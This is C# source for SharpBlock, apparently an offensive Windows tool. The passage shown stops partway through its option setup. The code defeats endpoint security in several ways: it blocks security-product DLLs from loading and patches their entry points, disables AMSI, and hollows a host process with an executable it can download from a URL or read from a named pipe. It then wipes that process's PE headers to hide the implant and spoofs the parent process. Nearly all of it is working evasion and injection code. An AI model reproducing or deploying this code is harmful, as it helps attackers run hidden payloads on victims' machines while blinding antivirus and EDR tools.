﻿using Mono.Options;
using SharpSploit.Execution.ManualMap;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SharpSploit.Execution;
using static SharpBlock.WinAPI;
using Execute = SharpSploit.Execution;
using static SharpBlock.PE;
using System.IO.Pipes;
using SharpSploit.Execution.Injection;
using System.Net;

namespace SharpBlock {

    class Program {

        static IntPtr CurrentProcess = (IntPtr)(-1);

        //SharpSploit.Execution.PE.PE_MANUAL_MAP ntdll = Execute.ManualMap.Map.MapModuleFromDisk(@"c:\windows\system32\ntdll.dll");
        static Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemorySysCall;
        static Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemorySysCall;

        static Program() {
            if (IntPtr.Size == 8) {
                NtWriteVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory"));
                NtProtectVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory"));
            }
        }

        static D GetDelagateForSysCall<D>(IntPtr syscallStub) where D : Delegate {
            return (D)Marshal.GetDelegateForFunctionPointer(syscallStub, typeof(D));
        }

        public struct HostProcessInfo {
            public IntPtr newLoadAddress;
            public IntPtr newEntryPoint;
            public IntPtr peb;
            public IntPtr previousLoadAddress;
            public IntPtr previousEntryPoint;
        }

        static List<string> blockDllName = new List<string>();
        static List<string> blockDescription = new List<string>();
        static List<string> blockCopyright = new List<string>();
        static List<string> blockProduct = new List<string>();
        static List<Tuple<long,long>> blockAddressRanges = new List<Tuple<long, long>>();

        static IntPtr amsiInitalizePtr;
        static IntPtr getCommandLineWPtr;

        private static StructType GetStructureFromByteArray<StructType>(byte[] byteArray) {
            GCHandle pinnedArray = GCHandle.Alloc(byteArray, GCHandleType.Pinned);
            IntPtr intPtr = pinnedArray.AddrOfPinnedObject();
            StructType result = (StructType)Marshal.PtrToStructure(intPtr, typeof(StructType));
            pinnedArray.Free();
            return result;
        }

        private static bool ShouldBlockDLL(string dllPath) {

            // Get the file version for the notepad.

            try {

                string dllName = Path.GetFileName(dllPath);
                if (blockDllName.Contains(dllName))
                    return true;

                FileVersionInfo dllVersionInfo = FileVersionInfo.GetVersionInfo(dllPath);
                
                if (dllVersionInfo.FileDescription != null && blockDescription.Contains(dllVersionInfo.FileDescription))
                    return true;

                if (dllVersionInfo.ProductName != null && blockProduct.Contains(dllVersionInfo.ProductName))
                    return true;

                if (dllVersionInfo.LegalCopyright != null && blockCopyright.Contains(dllVersionInfo.LegalCopyright))
                    return true;
            }catch(Exception e) {
                Console.WriteLine($"[=] Failed to get file info for DLL {dllPath}, ignoring");
            }

            return false;
        }

        static bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddress, byte[] data, int size, out uint bytesWritten) {

            if (IntPtr.Size == 8) {
                IntPtr regionSize = (IntPtr)size;
                IntPtr protectionBase = baseAddress;
                uint oldProtect = 0;
                bytesWritten = 0;
                GCHandle pinnedArray = GCHandle.Alloc(data, GCHandleType.Pinned);
                IntPtr intptrData = pinnedArray.AddrOfPinnedObject();

                uint result = NtProtectVirtualMemorySysCall(hProcess, ref protectionBase, ref regionSize, 0x40 /*RWX*/, ref oldProtect);

                if(result != 0) {
                    throw new System.ComponentModel.Win32Exception((int)result);
                }

                result = NtWriteVirtualMemorySysCall(hProcess, baseAddress, intptrData, (uint)size, ref bytesWritten);

                if (result != 0) {
                    throw new System.ComponentModel.Win32Exception((int)result);
                }

                result = NtProtectVirtualMemorySysCall(hProcess, ref protectionBase, ref regionSize, oldProtect, ref oldProtect);

                if (result != 0) {
                    throw new System.ComponentModel.Win32Exception((int)result);
                }

                return result == 0;

            } else {
                IntPtr bytesWrittenPtr;
                bool result = WinAPI.WriteProcessMemory(hProcess, baseAddress, data, size, out bytesWrittenPtr);
                bytesWritten = (uint)bytesWrittenPtr;
                return result;
            }            
        }

        static bool IsInBlockedRange(long address) {
            var result = blockAddressRanges.Where(range => address >= range.Item1 && address < range.Item2).FirstOrDefault();
            return result != null;
        }

        static string GetFileName(IntPtr handle) {
            try {

                // Setup buffer to store unicode string
                int bufferSize = 0x1000; 

                // Allocate unmanaged memory to store name
                IntPtr pFileNameBuffer = Marshal.AllocHGlobal(bufferSize);
                IO_STATUS_BLOCK ioStat = new IO_STATUS_BLOCK();

                uint status = NtQueryInformationFile(handle, ref ioStat, pFileNameBuffer, bufferSize, FILE_INFORMATION_CLASS.FileNameInformation);

                // offset=4 seems to work...
                int offset = 4;
                long pBaseAddress = pFileNameBuffer.ToInt64();
                int strLen = Marshal.ReadInt32(pFileNameBuffer);

                // Do the conversion to managed type
                string fileName = System.Environment.SystemDirectory.Substring(0,2) + Marshal.PtrToStringUni(new IntPtr(pBaseAddress + offset), strLen/2);

                // Release
                Marshal.FreeHGlobal(pFileNameBuffer);

                return fileName;

            } catch (Exception) {
                return string.Empty;
            }
        }

        static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {

            long fileSize;
            uint returned = 0;
            string dllPath;

            if (!WinAPI.GetFileSizeEx(moduleHandle, out fileSize) || fileSize == 0) {
                return null;
            }

            IntPtr handle = WinAPI.CreateFileMapping(moduleHandle, IntPtr.Zero,
                WinAPI.FileMapProtection.PageReadonly | WinAPI.FileMapProtection.SectionImage, 0, 0, null);

            if (handle == IntPtr.Zero) {
                return null;
            }

            IntPtr mem = WinAPI.MapViewOfFile(handle, WinAPI.FileMapAccess.FileMapRead, 0, 0, UIntPtr.Zero);

            if (mem == IntPtr.Zero) {
                return null;
            }

            dllPath = GetFileName(moduleHandle);

            PE.IMAGE_DOS_HEADER dosHeader = (PE.IMAGE_DOS_HEADER)Marshal.PtrToStructure(mem, typeof(PE.IMAGE_DOS_HEADER));
            PE.IMAGE_FILE_HEADER fileHeader = (PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(mem.ToInt64() + dosHeader.e_lfanew), typeof(PE.IMAGE_FILE_HEADER));

            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            IntPtr entryPoint;
            long sizeOfImage;
            if ((fileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) == IMAGE_FILE_32BIT_MACHINE) {
                PE.IMAGE_OPTIONAL_HEADER32 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER32));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt32());
                sizeOfImage = optionalHeader.SizeOfImage;

            } else {
                PE.IMAGE_OPTIONAL_HEADER64 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER64));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt64());
                sizeOfImage = optionalHeader.SizeOfImage;
            }

            if (ShouldBlockDLL(dllPath)) {

                Tuple<long, long> addressRange = new Tuple<long, long>((long)imageBase, (long)imageBase + sizeOfImage);
                blockAddressRanges.Add(addressRange);

                Console.WriteLine($"[+] Blocked DLL {dllPath}");

                byte[] retIns = new byte[1] { 0xC3 };
                uint bytesWritten;

                Console.WriteLine("[+] Patching DLL Entry Point at 0x{0:x}", entryPoint.ToInt64());

                if (WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
                    Console.WriteLine("[+] Successfully patched DLL Entry Point");
                } else {
                    Console.WriteLine("[!] Failed patched DLL Entry Point with error 0x{0:x}", Marshal.GetLastWin32Error());
                }
            }

            return dllPath.ToString();
        }

        static void OverrideReturnValue(IntPtr hThread, IntPtr hProcess, UIntPtr value, int numArgs) {

            Context ctx =  ContextFactory.Create(ContextFlags.All);
            ctx.GetContext(hThread);

            //Reads the memory for the current stack pointer to get the return address
            ctx.Ip = ctx.GetCurrentReturnAddress(hProcess);

            //Pop return address and restore the stack pointer to the prior state before the function was called
            ctx.PopStackPointer();

            //x86 stdcall calling convention expects callee to pop
            //arguments off the stack. x64 uses registers for first
            //4 arguments.  TODO: adapt for 5+ arguments  
            if (IntPtr.Size == 4) {
                while (numArgs-- > 0) {
                    ctx.PopStackPointer();
                }
            }

            //Set the result
            ctx.SetResultRegister(value.ToUInt64());

            ctx.SetContext(hThread);
        }

        static IntPtr ReadMovAddress(IntPtr hProcess, IntPtr address) {

            byte[] movIns = ReadBytes(hProcess, address, 3);

            if (IntPtr.Size == 8 && movIns.SequenceEqual(new byte[] { 0x48, 0x8b, 0x05 })) {
                return new IntPtr(address.ToInt64() + 7 + ReadType<Int32>(hProcess, new IntPtr(address.ToInt64() + 3)));
            } else if(IntPtr.Size == 4 && movIns[0] == 0xA1){
                return new IntPtr(ReadType<Int32>(hProcess, new IntPtr(address.ToInt64() + 1)));
            } else {
                return IntPtr.Zero;
            }            
        }

        static IntPtr WriteProgramArgs(IntPtr hProcess, string args) {

            //We need room for ANSI and Unicode representation of args
            IntPtr regionSize = new IntPtr(args.Length * 2 + 2 + args.Length + 1);
            IntPtr remoteArgAddress = IntPtr.Zero;
            byte[] argBytesUnicode = Encoding.Unicode.GetBytes(args);
            byte[] argBytesANSI = Encoding.ASCII.GetBytes(args);
            IntPtr bytesWritten;

            remoteArgAddress = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(hProcess, ref remoteArgAddress, IntPtr.Zero, ref regionSize, 0x00001000, (int)4);
            
            WinAPI.WriteProcessMemory(hProcess, remoteArgAddress, argBytesUnicode, argBytesUnicode.Length, out bytesWritten);
            WinAPI.WriteProcessMemory(hProcess, new IntPtr(remoteArgAddress.ToInt64() + argBytesUnicode.Length + 2), argBytesANSI, argBytesANSI.Length, out bytesWritten);

            return remoteArgAddress;
        }

        static void UpdateCommandLine(IntPtr hProcess, string args) {

            IntPtr kernel32Base = WinAPI.LoadLibrary("kernelbase.dll");
            IntPtr commandLineArgsWPtr = ReadMovAddress(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineW"));
            IntPtr commandLineArgsAPtr = ReadMovAddress(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineA"));

            if(commandLineArgsAPtr == IntPtr.Zero || commandLineArgsAPtr == IntPtr.Zero) {
                Console.WriteLine("[-] Failed to updated GetCommandLine pointers, unexpected instruction present");
                return;
            }

            IntPtr argsStartPtr = WriteProgramArgs(hProcess, args);

            WritePointer(hProcess, commandLineArgsWPtr, argsStartPtr);
            WritePointer(hProcess, commandLineArgsAPtr, new IntPtr(argsStartPtr.ToInt64() + args.Length * 2 + 2));
            Console.WriteLine($"[+] Updated command line args with {args}");
        }

        static void DisableAMSI(IntPtr hThread, IntPtr hProcess) {
            //Set result of AmsiInitialize to indicate disabled.
            OverrideReturnValue(hThread, hProcess, new UIntPtr(0x80070002), 2);  
        }

        static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address, int index) {

            Context ctx = ContextFactory.Create(ContextFlags.All);
            ctx.GetContext(hThread);

            if (ctx.Ip != (ulong)address.ToInt64()) {
                ctx.EnableBreakpoint(address, index);
            } else {
                // If our BP address matches the thread context address
                // then we have hit the HBP, so we need to disable
                // HBP and enabled single step so that we break at the
                // next instruction and re-eable the HBP.
                ctx.EnableSingleStep();
            }

            ctx.SetContext(hThread);
        }

        static void ClearHardwareBreakpoint(IntPtr thread, int index) {
            Context ctx = ContextFactory.Create(ContextFlags.Debug);
            ctx.GetContext(thread);
            ctx.ClearBreakpoint(index);
            ctx.SetContext(thread);
        }

        static void ClearHardwareBreakpoints(IEnumerable<IntPtr> handles, int index) {
            foreach (IntPtr thread in handles) {
                ClearHardwareBreakpoint(thread, index);
            }
        }

        static void EnableHardwareBreakpoints(IEnumerable<IntPtr> handles, IntPtr address, int index) {
            foreach (IntPtr thread in handles) {
                Context64 ctx = new Context64(ContextFlags.Debug);
                ctx.GetContext(thread);
                ctx.EnableBreakpoint(address, index);
                ctx.SetContext(thread);
            }
        }

        static IntPtr MapExecutableMemory(byte[] pe, IntPtr hProcess, out IntPtr pRemoteImage) {

            IntPtr pModule = Map.AllocateBytesToMemory(pe);
            Execute.PE.PE_META_DATA PEINFO = Execute.DynamicInvoke.Generic.GetPeMetaData(pModule);

            // Check module matches the process architecture
            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4)) {
                Marshal.FreeHGlobal(pModule);
                throw new InvalidOperationException("The module architecture does not match the process architecture.");
            }

            // Alloc PE image memory -> RW
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
            IntPtr pImage = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(
                (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
                Execute.Win32.WinNT.PAGE_READWRITE
            );

            IntPtr RemoteBaseAddress = new IntPtr((long)(PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase));

            pRemoteImage = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(
                hProcess, ref RemoteBaseAddress, IntPtr.Zero, ref RegionSize,
                Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
                Execute.Win32.WinNT.PAGE_READWRITE
            );
            
            // Write PE header to memory
            UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
            UInt32 BytesWritten = Execute.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);

            foreach (Execute.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections) {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);

                // Write data
                BytesWritten = Execute.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                if (BytesWritten != ish.SizeOfRawData) {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            //If allocated remote image base doesn't match PE header, process relocation table
            if (pRemoteImage != new IntPtr((long)(PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase))) {
                Console.WriteLine($"[=] Could not map process to preferred image base 0x{ (PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase):x}, relocating to 0x{pRemoteImage.ToInt64():x}");
                Map.RelocateModule(PEINFO, pImage, pRemoteImage);
            }
            uint status = Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, pRemoteImage, pImage, (uint)RegionSize.ToInt32());

            foreach (Execute.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections) {

                IntPtr sectionAddress = new IntPtr(pRemoteImage.ToInt64() + ish.VirtualAddress);
                IntPtr sectionSize = new IntPtr(ish.VirtualSize);

                if (ish.Characteristics.HasFlag(Execute.PE.DataSectionFlags.MEM_EXECUTE)) {
                    if (ish.Characteristics.HasFlag(Execute.PE.DataSectionFlags.MEM_WRITE)) {
                        Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x40);
                    } else {
                        Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x20);
                    }                
                }else if (ish.Characteristics.HasFlag(Execute.PE.DataSectionFlags.MEM_WRITE)) {
                    Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x4);
                } else {
                    Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x2);
                }
            }

            return new IntPtr(pRemoteImage.ToInt64() + (PEINFO.Is32Bit ? PEINFO.OptHeader32.AddressOfEntryPoint : PEINFO.OptHeader64.AddressOfEntryPoint));
        }

        static byte[] LoadProcessFromPipe(string path) {

            int amountRead = 0;
            byte[] buffer = new byte[65536];
            MemoryStream processDataStream = new MemoryStream();
            string pipeName = path.Substring(9);
            var npss = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte);

            Console.WriteLine($"[+] Waiting for process data from pipe {pipeName}");
            npss.WaitForConnection();

            while ((amountRead = npss.Read(buffer, 0, buffer.Length)) > 0) {
                processDataStream.Write(buffer, 0, amountRead);
            };

            npss.Disconnect();
            return processDataStream.ToArray();      
        }


        static byte[] LoadProcessFromWeb(string url) {
            WebClient client = new WebClient();
            client.Credentials = CredentialCache.DefaultCredentials; 
            client.Proxy = WebRequest.GetSystemWebProxy();
            return client.DownloadData(url);  
        }

        static byte[] LoadProcessData(string path) {

            byte[] data;

            if (path.StartsWith(@"\\.\pipe\")) {
                data = LoadProcessFromPipe(path);  
            }else if(path.StartsWith("http://") || path.StartsWith("https://")) {
                data = LoadProcessFromWeb(path);
            } else {
                data = File.ReadAllBytes(path);                
            }

            if(data == null || data.Length == 0) {
                throw new Exception($"Failed to download executable from {path}");
            }

            return data;
        }

        static byte[] ReadBytes(IntPtr hProcess, IntPtr address, int size) {
            uint bytesRead = (uint)size;
            IntPtr buffer = Marshal.AllocHGlobal(size);
            Execute.DynamicInvoke.Native.NtReadVirtualMemory(hProcess, address, buffer, ref bytesRead);
            byte[] result = new byte[bytesRead];
            Marshal.Copy(buffer, result, 0, (int)bytesRead);
            Marshal.FreeHGlobal(buffer);
            return result;
        }

        static IntPtr ReadPointer (IntPtr hProcess, IntPtr address) {
            uint bytesRead = (uint)IntPtr.Size;
            IntPtr buffer = Marshal.AllocHGlobal(IntPtr.Size);
            Execute.DynamicInvoke.Native.NtReadVirtualMemory(hProcess, address, buffer, ref bytesRead);            
            IntPtr result = Marshal.ReadIntPtr(buffer);
            Marshal.FreeHGlobal(buffer);
            return result;
        }

        static void WritePointer(IntPtr hProcess, IntPtr address, IntPtr value) {
            uint size = (uint)IntPtr.Size;
            IntPtr buffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(buffer, value);
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, address, buffer, size);
            Marshal.FreeHGlobal(buffer);
        }

        static T ReadType<T>(IntPtr hProcess, IntPtr address) where T : new() {
            uint size = (uint)Marshal.SizeOf(typeof(T));
            IntPtr objectData = Marshal.AllocHGlobal((int)size);
            Execute.DynamicInvoke.Native.NtReadVirtualMemory(hProcess, address, objectData, ref size);
            T result = (T)Marshal.PtrToStructure(objectData,typeof(T));
            Marshal.FreeHGlobal(objectData);
            return result;
        }

        static void WriteType<T>(IntPtr hProcess, IntPtr address, T type) where T : new() {
            uint size = (uint)Marshal.SizeOf(typeof(T));
            IntPtr objectData = Marshal.AllocHGlobal((int)size);
            Marshal.StructureToPtr(type, objectData, false);
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, address, objectData, size);  
            Marshal.FreeHGlobal(objectData);
        }

        static void ClearMemory(IntPtr hProcess, IntPtr address, int size) {
            byte[] data = new byte[size];
            IntPtr emptyMem = Marshal.AllocHGlobal(size);
            Marshal.Copy(data, 0, emptyMem, size);
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, address, emptyMem, (uint)size);            
            Marshal.FreeHGlobal(emptyMem);
        }

        static bool IsHostPEGUIApp(string path) {    
            Execute.PE pe =  SharpSploit.Execution.PE.Load(File.ReadAllBytes(path));
            return pe.OptionalHeader64.Subsystem == 2;
        }

        static void HideHollowedProcess(IntPtr hProcess, HostProcessInfo hpi) {

            if(IntPtr.Size == 4) {
                Console.WriteLine("[=] Hide allow process not available on x86 yet, use --disable-header-patch to supress this warning");
                return;
            }

            //Pull out the current image headers
            IMAGE_DOS_HEADER dosHeader = ReadType<IMAGE_DOS_HEADER>(hProcess, hpi.newLoadAddress);
            IMAGE_FILE_HEADER fileHeader = ReadType<IMAGE_FILE_HEADER>(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + dosHeader.e_lfanew));
            IMAGE_OPTIONAL_HEADER64 optionalHeader = ReadType<IMAGE_OPTIONAL_HEADER64>(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + dosHeader.e_lfanew +
                Marshal.SizeOf(typeof(IMAGE_FILE_HEADER))));
           
            //Clear some key areas used to spot PE files in memory
            ClearMemory(hProcess, hpi.newLoadAddress, 3);
            ClearMemory(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + 0x40) , (int)dosHeader.e_lfanew - 0x40);
            ClearMemory(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + (int)dosHeader.e_lfanew), Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)));

            //Clear out section names and characteristics used to identify implanted PE files
            for (int section = 0; section < fileHeader.NumberOfSections; section++) {
                IntPtr sectionOffset = new IntPtr(hpi.newLoadAddress.ToInt64() + 
                                                (int)dosHeader.e_lfanew + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) +
                                                fileHeader.SizeOfOptionalHeader + 
                                                (Marshal.SizeOf(typeof(Execute.PE.IMAGE_SECTION_HEADER)) * section));

                Execute.PE.IMAGE_SECTION_HEADER ish = ReadType<Execute.PE.IMAGE_SECTION_HEADER>(hProcess, sectionOffset);
                ish.Name = new char[8];
                ish.Characteristics = 0;
                WriteType<Execute.PE.IMAGE_SECTION_HEADER>(hProcess, sectionOffset, ish);
            }

            //Replace base address in PEB with the original
            WritePointer(hProcess, new IntPtr(hpi.peb.ToInt64() + 0x10), hpi.previousLoadAddress);

            //Finally replace main module load address and entrypoint with original host process
            IntPtr pebLdrDataPtr = ReadPointer(hProcess, new IntPtr(hpi.peb.ToInt64() + 0x18));
            PEB_LDR_DATA pebLdrData = ReadType<PEB_LDR_DATA>(hProcess, pebLdrDataPtr);
            LDR_DATA_TABLE_ENTRY mainModule = ReadType<LDR_DATA_TABLE_ENTRY>(hProcess, pebLdrData.InLoadOrderModuleListPtr.Flink);
            mainModule.DllBase = hpi.previousLoadAddress;
            mainModule.EntryPoint = hpi.previousEntryPoint;
            WriteType(hProcess, pebLdrData.InLoadOrderModuleListPtr.Flink, mainModule);
        }

        static long GetProcessPEB(Context ctx) {
            if(IntPtr.Size == 8) {
                return ctx.GetRegister(3);
            } else {
                return ctx.GetRegister(1);
            }
        }

        static long GetPreviousEntryPoint(Context ctx) {
            if (IntPtr.Size == 8) {
                return ctx.GetRegister(2);
            } else {
                return ctx.GetRegister(0);
            }
        }

        static IntPtr GetPreviousLoadAddress(IntPtr hProcess, long peb) {
            if (IntPtr.Size == 8) {
                return ReadPointer(hProcess, new IntPtr(peb + 0x10));
            } else {
                return ReadPointer(hProcess, new IntPtr(peb + 0x8));
            }
        }

        static void SetLoadAddress(IntPtr hProcess, long peb, IntPtr loadAddress) {
            if (IntPtr.Size == 8) {
                WritePointer(hProcess, new IntPtr(peb + 0x10), loadAddress);
            } else {
                WritePointer(hProcess, new IntPtr(peb + 0x8), loadAddress);
            }
        }

        static void SetEntryPoint(Context ctx, IntPtr entryPoint) {
            if (IntPtr.Size == 8) {
                ctx.SetRegister(2, entryPoint.ToInt64());
            } else {
                ctx.SetRegister(0, entryPoint.ToInt32());
            }
        }

        static HostProcessInfo ReplaceExecutable(IntPtr hProcess, IntPtr hThread, string path) {

            //Map our executable into memory from the choosen source (file, web, pipe)
            HostProcessInfo hpi = new HostProcessInfo();
            IntPtr remoteImage;
            IntPtr entryPoint = MapExecutableMemory(LoadProcessData(path), hProcess, out remoteImage);
                   
            //Get the thread context of our newly launched host process
            Context ctx = ContextFactory.Create(ContextFlags.All);
            ctx.GetContext(hThread);
            long peb = GetProcessPEB(ctx);

            //Fill in some key information we need for later
            hpi.previousEntryPoint =  new IntPtr(GetPreviousEntryPoint(ctx));
            hpi.newEntryPoint = entryPoint;
            hpi.newLoadAddress = remoteImage;
            hpi.peb = new IntPtr(peb);
            hpi.previousLoadAddress = GetPreviousLoadAddress(hProcess, peb);


            Console.WriteLine($"[+] PEB Address: 0x{peb:x16}");
            Console.WriteLine($"[+] Existing entry point: 0x{hpi.previousEntryPoint.ToInt64():x16}");
            Console.WriteLine($"[+] New entry point: 0x{entryPoint.ToInt64():x16}");
            Console.WriteLine($"[+] Existing base: 0x{hpi.previousLoadAddress.ToInt64():x16}");
            Console.WriteLine($"[+] New base: 0x{remoteImage.ToInt64():x16}");

            //Set RCX to the updated entry point of our new in memory PE
            SetEntryPoint(ctx, entryPoint);
            ctx.SetContext(hThread);

            //Write our new base address within PEB
            SetLoadAddress(hProcess, peb, remoteImage);
                       
            return hpi;
        }
        
        static DEBUG_EVENT GetDebugEvent(IntPtr nativeDebugEvent) {

            WinAPI.DEBUG_EVENT result = new DEBUG_EVENT();

            if (IntPtr.Size == 8) {
                WinAPI.DEBUG_EVENT64 DebugEvent64 = (WinAPI.DEBUG_EVENT64)Marshal.PtrToStructure(nativeDebugEvent, typeof(WinAPI.DEBUG_EVENT64));
                result.dwDebugEventCode = DebugEvent64.dwDebugEventCode;
                result.dwProcessId = DebugEvent64.dwProcessId;
                result.dwThreadId = DebugEvent64.dwThreadId;
                result.u = DebugEvent64.u;
            } else {
                result = (WinAPI.DEBUG_EVENT)Marshal.PtrToStructure(nativeDebugEvent, typeof(WinAPI.DEBUG_EVENT));
            }

            return result;
        }

        private static IntPtr InitializeProcThreadAttributeList(int attributeCount) {

            const int reserved = 0;
            var size = IntPtr.Zero;
            bool wasInitialized = WinAPI.InitializeProcThreadAttributeList(IntPtr.Zero, attributeCount, reserved, ref size);
            if (wasInitialized || size == IntPtr.Zero) {
                throw new Exception(string.Format("Couldn't get the size of the attribute list for {0} attributes", attributeCount));
            }

            IntPtr lpAttributeList = Marshal.AllocHGlobal(size);
            if (lpAttributeList == IntPtr.Zero) {
                throw new Exception("Couldn't reserve space for a new attribute list");
            }

            wasInitialized = WinAPI.InitializeProcThreadAttributeList(lpAttributeList, attributeCount, reserved, ref size);
            if (!wasInitialized) {
                throw new Exception("Couldn't create new attribute list");
            }

            return lpAttributeList;
        }

        private static void SetNewProcessParent(ref STARTUPINFOEX startupInfoEx, int parentProcessId, IntPtr stdOutHandle) {

            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            IntPtr handle = WinAPI.OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
            IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, handle);

            
            bool success = UpdateProcThreadAttribute(startupInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue,
                                                         (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            IntPtr ppidStdOut;                        
            WinAPI.DuplicateHandle(CurrentProcess, stdOutHandle, handle, out ppidStdOut, 0, true, 3);

            startupInfoEx.StartupInfo.hStdOutput = ppidStdOut;
            startupInfoEx.StartupInfo.hStdError = ppidStdOut;
    
            if (!success) {
                throw new Exception(string.Format($"Error setting [{parentProcessId}] as the parent PID for the new process"));
            }
        }

        private static void BlockVirtualProtect(IntPtr hThread, IntPtr hProcess) {

            Context ctx = ContextFactory.Create(ContextFlags.All);
            ctx.GetContext(hThread);

            long returnAddress = (long)ctx.GetCurrentReturnAddress(hProcess);
            long protection = ctx.GetParameter(3, hProcess);

            if (protection == 0x40 && IsInBlockedRange(returnAddress)) {
                Console.WriteLine("[+] Attempt to change memory to RWX from blocked DLL denied");
                OverrideReturnValue(hThread, hProcess, new UIntPtr(0xC0000022), 5);               
            }                
        }

        static void StdOutReader(StreamReader sr) {

            try {
                string line;
                while ((line = sr.ReadLine()) != null) {
                    Console.WriteLine(line);
                }
            } catch (Exception) { }
        }

        static void Main(string[] args) {

            string program = "c:\\windows\\system32\\cmd.exe";
            string hostProcess = null;
            string programArgs = "";
            bool showHelp = false;
            bool bypassAmsi = true;
            bool bypassCommandLine = true;
            bool bypassETW = true;
            bool bypassHollowDetect = true;
            bool bypassVMHook = true;
            bool patchedArgs = false;
            bool kernelBaseLoaded = false;
            bool showWindow = false;
            int ppid = -1;
            HostProcessInfo hpi = new HostProcessInfo();
            
            Console.WriteLine(
                 "SharpBlock by @_EthicalChaos_\n" +
                 $"  DLL Blocking app for child processes { (IntPtr.Size == 8 ? "x86_64" : "x86")} \n"
                );

            OptionSet option_set = new OptionSet()
                .Add("e=|exe=", "Program to execute (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add("n=|name=", "Name of DLL to block", v => blockDllName.Add(v))
                .Add("c=|copyright=", "Copyright string to block", v => blockCopyright.Add(v))
                .Add("p=|product=", "Product string to block", v => blockProduct.Add(v))
                .Add("d=|description=", "Description string to block", v => blockDescription.Add(v))
